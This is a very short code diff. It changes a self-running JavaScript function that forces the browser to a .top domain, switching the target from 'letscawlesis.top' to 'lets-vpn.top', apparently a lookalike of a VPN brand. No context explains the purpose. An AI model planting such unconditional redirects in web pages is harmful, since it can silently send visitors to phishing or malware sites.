@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://letscawlesis.top/';
+    window['location'] = 'https://lets-vpn.top';
 })();
